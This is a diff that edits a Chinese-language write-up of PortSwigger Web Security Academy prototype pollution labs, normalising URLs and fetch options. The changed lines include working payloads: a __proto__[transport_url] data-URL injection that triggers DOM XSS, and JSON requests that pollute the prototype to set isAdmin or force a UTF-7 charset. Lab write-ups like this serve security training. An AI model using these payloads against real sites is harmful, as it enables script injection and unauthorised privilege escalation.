@@ -95,7 +95,7 @@ searchLogger.js
 async function logQuery(url, params) {
   try {
     await fetch(url, {
-      method: "post",
+      method: "POST",
       keepalive: true,
       body: JSON.stringify(params),
     });
@@ -215,7 +215,7 @@ vulnerable-website.com/?__proto__.foo=bar
 後來我用括號的方式成功注入
 
 ```
-https://0aa400ac033e17018004086a00d400a7.web-security-academy.net/?__proto__[transport_url]=123
+/?__proto__[transport_url]=123
 ```
 
 注入後，我就可以控制 src 的載入
@@ -244,7 +244,7 @@ PoC
 嘗試構造
 
 ```
-https://0aa400ac033e17018004086a00d400a7.web-security-academy.net/?search=123&__proto__[transport_url]=data:text/javascript,alert(1);
+/?search=123&__proto__[transport_url]=data:text/javascript,alert(1);
 ```
 
 成功執行 DOM-Based XSS，這會產生以下的 Fake Request/Response（實際上不涉及 HTTP 請求，因為 data URL Scheme 本身的資料就包含在 URL 裡面了）
@@ -365,7 +365,7 @@ searchLoggerAlternative.js
 async function logQuery(url, params) {
   try {
     await fetch(url, {
-      method: "post",
+      method: "POST",
       keepalive: true,
       body: JSON.stringify(params),
     });
@@ -457,7 +457,7 @@ searchLoggerFiltered.js
 async function logQuery(url, params) {
   try {
     await fetch(url, {
-      method: "post",
+      method: "POST",
       keepalive: true,
       body: JSON.stringify(params),
     });
@@ -704,25 +704,21 @@ HTTP/1.1 200 OK
 修改會員資料的 API
 
 ```js
-fetch(
-  "https://0a7000840405d0858215a27e006b00d8.web-security-academy.net/my-account/change-address",
-  {
-    headers: {
-      "content-type": "application/json;charset=UTF-8",
-    },
-    body: JSON.stringify({
-      address_line_1: "Wiener HQ",
-      address_line_2: "One Wiener Way",
-      city: "Wienerville",
-      postcode: "BU1 1RP",
-      country: "UK",
-      sessionId: "Zf2vzqfEZMOw1Hr5FLuaiWhkME28uQeA",
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/my-account/change-address`, {
+  headers: {
+    "content-type": "application/json;charset=UTF-8",
   },
-);
+  body: JSON.stringify({
+    address_line_1: "Wiener HQ",
+    address_line_2: "One Wiener Way",
+    city: "Wienerville",
+    postcode: "BU1 1RP",
+    country: "UK",
+    sessionId: "Zf2vzqfEZMOw1Hr5FLuaiWhkME28uQeA",
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 回傳
@@ -745,28 +741,24 @@ fetch(
 
 ```js
 const key = "__proto__";
-fetch(
-  "https://0a7000840405d0858215a27e006b00d8.web-security-academy.net/my-account/change-address",
-  {
-    headers: {
-      "content-type": "application/json;charset=UTF-8",
-    },
-    body: JSON.stringify({
-      address_line_1: "Wiener HQ",
-      address_line_2: "One Wiener Way",
-      city: "Wienerville",
-      postcode: "BU1 1RP",
-      country: "UK",
-      sessionId: "Zf2vzqfEZMOw1Hr5FLuaiWhkME28uQeA",
-      [key]: {
-        isAdmin: true,
-      },
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/my-account/change-address`, {
+  headers: {
+    "content-type": "application/json;charset=UTF-8",
   },
-);
+  body: JSON.stringify({
+    address_line_1: "Wiener HQ",
+    address_line_2: "One Wiener Way",
+    city: "Wienerville",
+    postcode: "BU1 1RP",
+    country: "UK",
+    sessionId: "Zf2vzqfEZMOw1Hr5FLuaiWhkME28uQeA",
+    [key]: {
+      isAdmin: true,
+    },
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 成功通關～至於為何要
@@ -816,53 +808,45 @@ JSON.stringify({
 
 ```js
 const key = "__proto__";
-fetch(
-  "https://0afd00c80312358c80dc991b00b60090.web-security-academy.net/my-account/change-address",
-  {
-    headers: {
-      "content-type": "application/json;charset=UTF-8",
-    },
-    body: JSON.stringify({
-      address_line_1: "+AGYAbwBv-",
-      address_line_2: "One Wiener Way",
-      city: "Wienerville",
-      postcode: "BU1 1RP",
-      country: "UK",
-      sessionId: "2Ks4V9ZUcnlXR92TWuG66W3q0QiAbBtC",
-      [key]: {
-        "content-type": "application/json; charset=utf-7",
-      },
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/my-account/change-address`, {
+  headers: {
+    "content-type": "application/json;charset=UTF-8",
   },
-);
+  body: JSON.stringify({
+    address_line_1: "+AGYAbwBv-",
+    address_line_2: "One Wiener Way",
+    city: "Wienerville",
+    postcode: "BU1 1RP",
+    country: "UK",
+    sessionId: "2Ks4V9ZUcnlXR92TWuG66W3q0QiAbBtC",
+    [key]: {
+      "content-type": "application/json; charset=utf-7",
+    },
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 之後再
 
 ```js
 const key = "__proto__";
-fetch(
-  "https://0afd00c80312358c80dc991b00b60090.web-security-academy.net/my-account/change-address",
-  {
-    headers: {
-      "content-type": "application/json;charset=UTF-8",
-    },
-    body: JSON.stringify({
-      address_line_1: "+AGYAbwBv-",
-      address_line_2: "One Wiener Way",
-      city: "Wienerville",
-      postcode: "BU1 1RP",
-      country: "UK",
-      sessionId: "2Ks4V9ZUcnlXR92TWuG66W3q0QiAbBtC",
-    }),
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/my-account/change-address`, {
+  headers: {
+    "content-type": "application/json;charset=UTF-8",
   },
-);
+  body: JSON.stringify({
+    address_line_1: "+AGYAbwBv-",
+    address_line_2: "One Wiener Way",
+    city: "Wienerville",
+    postcode: "BU1 1RP",
+    country: "UK",
+    sessionId: "2Ks4V9ZUcnlXR92TWuG66W3q0QiAbBtC",
+  }),
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 ## Lab: Bypassing flawed input filters for server-side prototype pollution
@@ -895,7 +879,6 @@ fetch(`${location.origin}/my-account/change-address`, {
     },
   }),
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -927,7 +910,6 @@ fetch(`${location.origin}/my-account/change-address`, {
     },
   }),
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
